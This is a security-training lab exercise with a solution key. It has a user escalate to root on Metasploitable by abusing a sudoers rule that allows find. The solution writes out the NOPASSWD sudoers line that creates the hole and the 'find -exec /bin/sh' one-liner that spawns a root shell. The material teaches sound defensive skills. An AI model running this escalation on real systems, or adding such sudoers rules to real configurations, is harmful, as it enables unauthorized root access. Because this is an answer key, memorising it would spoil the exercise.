title: Linux Privilege Escalation via Sudo Misconfiguration
description: Escalate from a low-priv user to root on a simulated misconfigured system.
problemStatement:
# Objective
Simulate a common privilege escalation scenario: exploiting a sudo misconfiguration.

## Setup on Metasploitable
1.  SSH as `msfadmin` (password: `msfadmin`).
2.  Create a test user: `sudo useradd -m lowpriv`
3.  Set password: `sudo passwd lowpriv` (set to `password`).
4.  Give the user sudo rights for `find`: `sudo visudo` and add line:
    `lowpriv ALL=(ALL) NOPASSWD: /usr/bin/find`
5.  Exit and SSH as `lowpriv`.

## Task
1.  As `lowpriv`, check sudo permissions: `sudo -l`.
2.  Use the allowed `find` command to spawn a root shell.
3.  Confirm root access with `whoami` and `id`.

## Deliverable
Screenshot showing the command used and the resulting root shell prompt.
hints: GTFOBins (https://gtfobins.github.io) is the ultimate resource for this.
solutionCode:
# Setup (as msfadmin)
sudo useradd -m lowpriv
echo "lowpriv:password" | sudo chpasswd
sudo bash -c 'echo "lowpriv ALL=(ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers'

# Exploit (as lowpriv)
sudo -l
# Output: (root) NOPASSWD: /usr/bin/find

sudo find . -exec /bin/sh \; -quit
whoami
# Output: root
